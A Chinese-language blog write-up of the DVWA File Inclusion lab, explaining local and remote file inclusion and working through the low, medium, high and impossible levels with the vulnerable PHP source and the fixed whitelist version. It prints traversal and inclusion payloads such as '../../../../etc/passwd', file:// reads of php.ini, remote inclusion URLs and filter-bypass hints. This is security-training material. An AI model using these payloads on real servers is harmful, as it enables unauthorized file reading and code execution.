---
layout:    post
title:     DVWA之FileInclusion
subtitle:  学习学习
date:      2020-12-14
author:    lll-yz
header-img: img/post-bg-coffee.jpg
catalog:    true
tags:

   - DVWA
---

#### File Inclusion

##### 什么是 File Inclusion

###### 简介

​		文件包含漏洞，是指当服务器开启allow_url_include选项时，就可以通过PHP的某些特性函数(include(), require(), include_once(), require_once())利用url去动态包含文件，此时如果没有对文件来源进行严格的审查，就会导致任意文件读取或任意命令执行。文件包含漏洞分为：本地文件包含漏洞和远程文件包含漏洞，远程文件包含漏洞是因为PHP配置中的allow_url_fopen开启，服务器允许包含一个远程文件。

###### 相关函数

**include():**  将指定的文件读入并且执行里面的程序。

**require():**  将文件的内容读入，并且把自己本身替换成这些读入的内容。

**include_once():**  和include函数完全相同，唯一区别是如果该文件中已经被包含过，则不会再次包含。

**require_once():**  和require函数完全相同，唯一区别是如果该文件中已经被包含过，则不会再次包含。

###### 文件包含功能

​		include和require函数的主要区别是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误时，会直接报错并退出程序的执行。

​		文件包含功能使用include函数将web根目录以外的目录文件包含进来，文件包含功能给开发人员带来了便利。通过把常用的功能归类成文件，文件包含可以提高代码重用率。

​		文件包含漏洞是高危漏洞，往往会导致任意文件读取和任意命令执行，造成严重的安全后果。

​		文件包含往往要使用到目录遍历工具。

###### 相关知识

**1.文件包含分类：**

​		目录遍历(Directory traversal) 和 文件包含(File include) 的一些区别：

​		目录遍历：可以读取web根目录以外的其他目录，根源在于web application 的路径访问权限设置不严，针对的是本系统。

​		文件包含：通过include函数将web根目录以外的目录的文件被包含进来，分为LFI本地文件包含和RFI远程文件包含。

LFI：本地文件包含(Local File Inclusion)

RFI：远程文件包含(Remote File Inclusion)

**2.php.ini设置**

allow_url_fopen=on (默认开启)

allow_url_include=on (默认关闭)

远程文件包含是因为开启了PHP配置中的allow_url_fopen选项(选项开启后，服务器允许包含一个远程的文件)。

###### 文件包含漏洞的一般特征

```
?page=a.PHP
?home=a.html
?file=content
```

###### 文件包含测试

1.通过多个 .../  让目录返回上一级，然后再加入目标目录

```
?file=../../../../../etc/passwd
?page=file:///etc/passwd
?home=main.cgi
?page=http://www.a.com/1.php
http://1.1.1.1/../../../../dir/file.txt
```

2.编码字符绕过过滤

```
1.可以使用多种编码方式进行绕过
2.%00嵌入任意位置
3. .的利用
```

``注意：服务器包含文件时，不管文件后缀是否是PHP，都会尝试当作PHP文件执行，如果文件内容确为PHP，则会正常执行并返回结果；如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。``

##### low

```
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

?> 
```

源码没有进行任何过滤。

```
?page=include.php/
```

[![rQXaVg.md.png](https://s3.ax1x.com/2020/12/16/rQXaVg.md.png)](https://imgchr.com/i/rQXaVg)

看报错信息，直接将网站的路径信息给我们暴露出来了：

第一条warring是找不到我们指定的page，给出警告；

第二条warring是因为没有找到指定的page，在**包含**时出错。根据暴露出来的绝对路径：``/var/www/html/dvwa/vulnerabilities/fi/index.php `` , 通过访问相对路径的方式``../`` 访问所有的路径，如访问

```
?page=../../phpinfo.php
```

[![rQjCsf.md.png](https://s3.ax1x.com/2020/12/16/rQjCsf.md.png)](https://imgchr.com/i/rQjCsf)

尝试远程文件包含：

在本地建立一个info.txt文件：（路径：/var/www/html/info.txt）

```
<?php phpinfo(); ?>
```

构造URL：

```
?page=http://127.0.0.1/info.txt
```

[![rD8ySe.md.png](https://s3.ax1x.com/2020/12/22/rD8ySe.md.png)](https://imgchr.com/i/rD8ySe)

##### medium

```
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );

?> 
```

可以看到，代码对远程文件包含进行了限制，用str_replace函数将``http://``、``https//``、``../``、``..\``进行了替换，换为了空字符。

可以采用双写绕过。

本地包含：

[![rrf7t0.md.png](https://s3.ax1x.com/2020/12/22/rrf7t0.md.png)](https://imgchr.com/i/rrf7t0)

远程包含：

[![rrfHhV.md.png](https://s3.ax1x.com/2020/12/22/rrfHhV.md.png)](https://imgchr.com/i/rrfHhV)

##### high

```
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?> 
```

**fnmatch()：** 

[![rsixAA.md.jpg](https://s3.ax1x.com/2020/12/22/rsixAA.md.jpg)](https://imgchr.com/i/rsixAA)

high级别代码，使用了fnmatch函数检查page参数，要求page参数的开头必须是file的文件或只能为include.php文件服务器才会去包含相应文件。

使用file协议，以file字符串开头：

```
?page=file:///var/www/html/dvwa/php.ini
```

成功读取到服务器配置文件：

[![rs9H1S.md.png](https://s3.ax1x.com/2020/12/22/rs9H1S.md.png)](https://imgchr.com/i/rs9H1S)

file协议简单来说就是我们直接用浏览器打开的本地文件一样。

如：

[![rsCYNt.png](https://s3.ax1x.com/2020/12/22/rsCYNt.png)](https://imgchr.com/i/rsCYNt)

##### impossible

```
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Only allow include.php or file{1..3}.php
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?> 
```

impossible级别的代码使用了白名单过滤的方法，包含的文件名只能为白名单中的文件，避免了文件包含漏洞的产生。